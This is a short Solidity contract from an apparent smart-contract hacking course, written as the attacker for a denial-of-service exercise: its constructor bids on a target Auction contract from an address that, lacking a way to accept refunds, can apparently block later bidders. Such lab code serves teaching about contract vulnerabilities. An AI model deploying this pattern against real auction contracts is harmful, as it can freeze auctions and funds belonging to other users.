// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
pragma solidity ^0.8.13;

import {Auction} from "../dos-2/Auction.sol";

/**
 * @title Auction
 * @author JohnnyTime (https://smartcontractshacking.com)
 */
contract AttackAuction {
    Auction auction;

    constructor(address _contractAddress) payable {
        auction = Auction(_contractAddress);
        auction.bid{value: msg.value}();
    }
}
